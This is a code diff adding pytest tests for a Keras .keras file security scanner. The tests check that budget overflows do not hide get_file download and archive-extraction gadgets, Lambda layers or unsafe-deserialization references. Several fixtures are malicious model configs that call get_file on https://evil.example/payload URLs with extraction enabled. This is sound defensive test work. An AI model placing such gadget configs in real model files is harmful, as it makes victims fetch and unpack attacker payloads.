@@ -7750,6 +7750,240 @@ class TestKerasZipConfigTraversalBudget:
             [],
         )
 
+    @pytest.mark.parametrize(
+        ("detector_name", "gadget", "cve_id"),
+        [
+            (
+                "_check_get_file_gadget",
+                {"fn": "keras.utils.get_file", "url": "https://evil.example/payload.bin"},
+                "CVE-2025-8747",
+            ),
+            (
+                "_check_get_file_archive_extraction",
+                {
+                    "fn": "keras.utils.get_file",
+                    "origin": "https://evil.example/payload.tar.gz",
+                    "extract": True,
+                },
+                "CVE-2025-12060",
+            ),
+        ],
+    )
+    def test_literal_overflow_does_not_hide_later_admitted_get_file_gadget(
+        self,
+        detector_name: str,
+        gadget: dict[str, Any],
+        cve_id: str,
+    ) -> None:
+        scanner = KerasZipScanner(
+            {
+                "max_config_traversal_items": 100,
+                "max_config_string_literals": 100,
+                "max_config_string_chars": 128,
+            }
+        )
+        scanner.current_file_path = "bounded.keras"
+        result = ScanResult(scanner_name=scanner.name, scanner=scanner)
+        config = {
+            "padding": "x" * 129,
+            "overflow": {"padding": "y" * 129},
+            "nested": gadget,
+        }
+
+        getattr(scanner, detector_name)(config, result)
+
+        assert any(issue.details.get("cve_id") == cve_id for issue in result.issues)
+        assert "keras_zip_config_string_char_limit_exceeded" in result.metadata["scan_outcome_reasons"]
+
+    @pytest.mark.parametrize("detector_name", ["_check_get_file_gadget", "_check_get_file_archive_extraction"])
+    def test_literal_overflow_does_not_turn_get_file_near_match_into_finding(self, detector_name: str) -> None:
+        scanner = KerasZipScanner(
+            {
+                "max_config_traversal_items": 100,
+                "max_config_string_literals": 100,
+                "max_config_string_chars": 128,
+            }
+        )
+        scanner.current_file_path = "bounded.keras"
+        result = ScanResult(scanner_name=scanner.name, scanner=scanner)
+        config = {
+            "padding": "x" * 129,
+            "nested": {
+                "fn": "get_file_helper",
+                "origin": "https://evil.example/payload.tar.gz",
+                "extract": True,
+            },
+        }
+
+        getattr(scanner, detector_name)(config, result)
+
+        assert not [
+            issue for issue in result.issues if issue.details.get("cve_id") in {"CVE-2025-8747", "CVE-2025-12060"}
+        ]
+        assert "keras_zip_config_string_char_limit_exceeded" in result.metadata["scan_outcome_reasons"]
+
+    @pytest.mark.parametrize(
+        ("layer_class", "expected_check", "expected_cve"),
+        [
+            ("Lambda", None, "CVE-2024-3660"),
+            ("UntrustedCustomLayer", "Custom Layer Class Detection", None),
+        ],
+    )
+    def test_string_overflow_preserves_queued_layer_security_findings(
+        self,
+        layer_class: str,
+        expected_check: str | None,
+        expected_cve: str | None,
+    ) -> None:
+        scanner = KerasZipScanner(
+            {
+                "max_config_traversal_items": 100,
+                "max_config_string_literals": 100,
+                "max_config_string_chars": 128,
+            }
+        )
+        scanner.current_file_path = "bounded.keras"
+        result = ScanResult(scanner_name=scanner.name, scanner=scanner)
+        config = {
+            "padding": "x" * 129,
+            "config": {"layers": [{"class_name": layer_class, "config": {}}]},
+        }
+
+        bounded_config = scanner._validate_config_traversal_budget(config, result)
+        scanner._scan_model_config(bounded_config, result)
+
+        if expected_cve is not None:
+            assert any(issue.details.get("cve_id") == expected_cve for issue in result.issues)
+        if expected_check is not None:
+            assert any(check.name == expected_check and check.status == CheckStatus.FAILED for check in result.checks)
+        assert "keras_zip_config_string_char_limit_exceeded" in result.metadata["scan_outcome_reasons"]
+
+    def test_security_projection_strings_share_bounded_reserve_after_overflow(self) -> None:
+        scanner = KerasZipScanner(
+            {
+                "max_config_traversal_items": 1_000,
+                "max_config_string_literals": 1_000,
+                "max_config_string_chars": 16,
+            }
+        )
+        scanner.current_file_path = "bounded.keras"
+        result = ScanResult(scanner_name=scanner.name, scanner=scanner)
+        config = {
+            "padding": "x" * 17,
+            "compile_config": {"metrics": [f"metric_{index:04d}" for index in range(100)]},
+        }
+
+        bounded_config = scanner._validate_config_traversal_budget(config, result)
+
+        projected_metrics = bounded_config["compile_config"]["metrics"]
+        assert sum(len(metric) for metric in projected_metrics) <= 16
+        assert "keras_zip_config_string_char_limit_exceeded" in result.metadata["scan_outcome_reasons"]
+
+    def test_projection_unknown_keys_remain_item_bounded_after_string_overflow(self) -> None:
+        class CountingDict(dict[str, Any]):
+            item_iterations = 0
+
+            def items(self) -> Iterator[tuple[str, Any]]:  # type: ignore[override]
+                for item in super().items():
+                    type(self).item_iterations += 1
+                    if type(self).item_iterations > 6:
+                        pytest.fail("projection iterated unknown keys beyond the direct-work budget")
+                    yield item
+
+        scanner = KerasZipScanner(
+            {
+                "max_config_traversal_items": 5,
+                "max_config_string_literals": 100,
+                "max_config_string_chars": 128,
+            }
+        )
+        scanner.current_file_path = "bounded.keras"
+        result = ScanResult(scanner_name=scanner.name, scanner=scanner)
+        config = ["x" * 129, CountingDict({f"unknown_{index}": "benign" for index in range(1_000)})]
+
+        scanner._validate_config_traversal_budget(config, result)
+
+        assert CountingDict.item_iterations <= 6
+        assert "keras_zip_config_string_char_limit_exceeded" in result.metadata["scan_outcome_reasons"]
+        assert "keras_zip_config_traversal_item_limit_exceeded" in result.metadata["scan_outcome_reasons"]
+
+    def test_literal_overflow_does_not_hide_queued_unsafe_deserialization(self) -> None:
+        scanner = KerasZipScanner(
+            {
+                "max_config_traversal_items": 100,
+                "max_config_string_literals": 100,
+                "max_config_string_chars": 128,
+            }
+        )
+        scanner.current_file_path = "bounded.keras"
+        result = ScanResult(scanner_name=scanner.name, scanner=scanner)
+        config = [
+            "x" * 129,
+            {"module": "keras.config", "fn": "enable_unsafe_deserialization"},
+        ]
+
+        assert scanner._has_unsafe_deserialization_reference(config, result) is True
+        assert "keras_zip_config_string_char_limit_exceeded" in result.metadata["scan_outcome_reasons"]
+
+    def test_literal_overflow_does_not_flag_unsafe_deserialization_near_match(self) -> None:
+        scanner = KerasZipScanner(
+            {
+                "max_config_traversal_items": 100,
+                "max_config_string_literals": 100,
+                "max_config_string_chars": 128,
+            }
+        )
+        scanner.current_file_path = "bounded.keras"
+        result = ScanResult(scanner_name=scanner.name, scanner=scanner)
+        config = [
+            "x" * 129,
+            {"module": "keras.config", "fn": "enable_unsafe_deserialization_helper"},
+        ]
+
+        assert scanner._has_unsafe_deserialization_reference(config, result) is False
+        assert "keras_zip_config_string_char_limit_exceeded" in result.metadata["scan_outcome_reasons"]
+
+    @pytest.mark.parametrize(
+        ("callable_name", "expected"),
+        [("get_file", True), ("get_file_helper", False)],
+    )
+    def test_nested_callable_get_file_reference_is_scoped_to_exact_callable(
+        self,
+        callable_name: str,
+        expected: bool,
+    ) -> None:
+        scanner = KerasZipScanner()
+        scanner.current_file_path = "bounded.keras"
+        result = ScanResult(scanner_name=scanner.name, scanner=scanner)
+        config = {
+            "fn": {"module": "keras.utils", "config": callable_name},
+            "url": "https://evil.example/payload.bin",
+        }
+
+        scanner._check_get_file_gadget(config, result)
+
+        cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-8747"]
+        assert bool(cve_issues) is expected
+
+    def test_archive_origin_is_bounded_before_strip_and_url_matching(self) -> None:
+        class GuardedOrigin(str):
+            def strip(self, chars: str | None = None, /) -> str:
+                pytest.fail("archive detector stripped the unbounded origin")
+
+        scanner = KerasZipScanner()
+        scanner.current_file_path = "bounded.keras"
+        result = ScanResult(scanner_name=scanner.name, scanner=scanner)
+        origin = GuardedOrigin(f"https://evil.example/{'x' * 10_000}.tar.gz")
+
+        scanner._check_get_file_archive_extraction(
+            {"fn": "keras.utils.get_file", "origin": origin, "extract": True},
+            result,
+        )
+
+        cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]
+        assert len(cve_issues) == 1
+        assert len(cve_issues[0].details["urls"][0]) <= scanner.MAX_CONFIG_SECURITY_LITERAL_CHARS
+
     def test_bounded_projection_limits_root_layer_scanning(self) -> None:
         class CountingList(list[Any]):
             item_iterations = 0
@@ -8115,15 +8349,26 @@ class TestKerasZipConfigTraversalBudget:
         assert CountingDict.item_iterations <= 6
         assert "keras_zip_config_traversal_item_limit_exceeded" in result.metadata["scan_outcome_reasons"]
 
-    @pytest.mark.parametrize("detector_name", ["_check_get_file_gadget", "_has_unsafe_deserialization_reference"])
-    def test_direct_string_budget_is_global_across_admitted_dicts(self, detector_name: str) -> None:
+    @pytest.mark.parametrize(
+        ("detector_name", "max_item_iterations"),
+        [
+            ("_check_get_file_gadget", 12),
+            ("_check_get_file_archive_extraction", 12),
+            ("_has_unsafe_deserialization_reference", 12),
+        ],
+    )
+    def test_direct_string_budget_is_globally_bounded_across_admitted_dicts(
+        self,
+        detector_name: str,
+        max_item_iterations: int,
+    ) -> None:
         class CountingDict(dict[str, Any]):
             item_iterations = 0
 
             def items(self) -> Iterator[tuple[str, Any]]:  # type: ignore[override]
                 for item in super().items():
                     type(self).item_iterations += 1
-                    if type(self).item_iterations > 12:
+                    if type(self).item_iterations > max_item_iterations:
                         pytest.fail("detector multiplied its direct item budget across admitted dicts")
                     yield item
 
@@ -8140,7 +8385,7 @@ class TestKerasZipConfigTraversalBudget:
 
         getattr(scanner, detector_name)(config, result)
 
-        assert CountingDict.item_iterations <= 12
+        assert CountingDict.item_iterations <= max_item_iterations
         assert "keras_zip_config_traversal_item_limit_exceeded" in result.metadata["scan_outcome_reasons"]
 
     def test_truncated_unsafe_deserialization_near_match_does_not_trigger(self) -> None:
